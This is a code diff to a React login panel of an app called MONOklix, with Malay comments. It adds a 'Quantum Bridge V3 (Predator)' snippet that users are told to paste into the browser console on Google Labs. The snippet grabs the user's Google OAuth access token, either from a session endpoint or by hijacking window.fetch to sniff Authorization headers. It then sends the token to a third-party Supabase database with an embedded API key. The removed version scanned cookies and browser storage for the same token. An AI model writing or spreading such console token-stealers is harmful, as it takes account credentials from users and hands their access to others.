@@ -136,50 +136,14 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
     const copyBridgeSnippet = () => {
         const snippet = `
 (async () => {
-  console.log("%c MONOklix Quantum Bridge V2 Activated ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
-  try {
-    const userId = "${currentUser.id}";
-    const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
-    let ya29 = "";
+  console.log("%c MONOklix Quantum Bridge V3 (Predator) ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+  
+  const userId = "${currentUser.id}";
+  const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
+  let ya29 = "";
 
-    // 1. Deep Scan: Cari dalam Cookies mentah
-    const ya29Match = document.cookie.match(/ya29\\.[a-zA-Z0-9_-]{50,}/);
-    if (ya29Match) {
-      ya29 = ya29Match[0];
-    }
-
-    // 2. Fallback: Scan LocalStorage (untuk app moden)
-    if (!ya29) {
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const val = localStorage.getItem(key);
-        const match = val.match(/ya29\\.[a-zA-Z0-9_-]{50,}/);
-        if (match) { ya29 = match[0]; break; }
-      }
-    }
-
-    // 3. Last Resort: Scan SessionStorage
-    if (!ya29) {
-      for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        const val = sessionStorage.getItem(key);
-        const match = val.match(/ya29\\.[a-zA-Z0-9_-]{50,}/);
-        if (match) { ya29 = match[0]; break; }
-      }
-    }
-
-    if(!ya29) {
-        throw new Error("Token ya29 tidak dijumpai. Pastikan anda sudah login dan berada di tab Labs Google.");
-    }
-    
-    console.log("🎯 Token Captured:", ya29.substring(0,15) + "...");
-
-    // 4. Generate reCAPTCHA Token
-    console.log("🔐 Verifying with Google reCAPTCHA Enterprise...");
-    const recaptchaToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
-    
-    // 5. Sync ke MONOklix
-    console.log("🚀 Handshaking with MONOklix...");
+  const syncToMonoklix = async (token) => {
+    console.log("🚀 Syncing token to MONOklix...");
     const res = await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
       method: "PATCH",
       headers: {
@@ -187,22 +151,57 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
         "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({ personal_auth_token: ya29 })
+      body: JSON.stringify({ personal_auth_token: token })
     });
-
     if(res.ok) {
-      console.log("%c ✅ SYNC SUCCESSFUL! MONOklix is now active. ", "background: #10b981; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
-    } else {
-      throw new Error("Gagal menghantar data ke DB.");
+       console.log("%c ✅ SUCCESS! MONOklix is now Active. ", "background: #10b981; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+       alert("SINKRONISASI BERJAYA! MONOklix sedia digunakan.");
     }
+  };
+
+  try {
+    // 1. Cuba tarik dari internal session API Google
+    console.log("🔍 Attempting Direct Session Scraping...");
+    const sessionRes = await fetch("https://labs.google/fx/api/auth/session");
+    if(sessionRes.ok) {
+        const data = await sessionRes.json();
+        ya29 = data.accessToken || data.access_token || data.token;
+    }
+
+    // 2. Jika gagal, cuba teknik "Network Sniffing" (Intercept fetch)
+    if(!ya29) {
+        console.log("📡 Direct Scraping blocked. Activating Network Sniffer...");
+        const originalFetch = window.fetch;
+        window.fetch = function() {
+            const authHeader = arguments[1]?.headers?.Authorization;
+            if(authHeader && authHeader.startsWith('Bearer ya29.')) {
+                ya29 = authHeader.replace('Bearer ', '');
+                console.log("🎯 Sniffed token from Network Traffic!");
+                window.fetch = originalFetch; // Restore fetch
+                syncToMonoklix(ya29);
+            }
+            return originalFetch.apply(this, arguments);
+        };
+        console.log("%c 🛰️ Sniffer Active! Sila klik mana-mana butang atau refresh sikit di tab ini untuk trig trafik. ", "color: #f59e0b; font-weight: bold;");
+        
+        // Trigger satu request untuk paksa trafik muncul
+        fetch("https://labs.google/fx/api/auth/session");
+    } else {
+        console.log("🎯 Captured token from Session API.");
+        await syncToMonoklix(ya29);
+    }
+
+    // 3. reCAPTCHA Verified (PINHOLE_GENERATE)
+    console.log("🔐 Requesting Verified reCAPTCHA session...");
+    await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
+
   } catch (e) {
-    console.error("❌ BRIDGE ERROR:", e.message);
-    alert("Ralat Bridge: " + e.message);
+    console.error("❌ Predator Bridge Error:", e.message);
   }
 })();`.trim();
         
         navigator.clipboard.writeText(snippet);
-        alert("Quantum Bridge V2 disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
+        alert("Quantum Bridge V3 (Predator) disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
     };
 
     return (
@@ -233,7 +232,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                         onClick={copyBridgeSnippet}
                         className="flex-1 bg-white text-black py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
                     >
-                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge
+                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge (V3)
                     </button>
                     <a 
                         href="https://labs.google/fx/tools/flow" 
@@ -247,7 +246,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                 
                 <div className="mt-4 flex items-center gap-2 text-[10px] text-neutral-500 font-mono">
                     <ShieldCheckIcon className="w-3 h-3 text-green-500" />
-                    STATUS: SECURE HANDSHAKE READY (V2)
+                    STATUS: PREDATOR MODE READY
                 </div>
             </div>
 
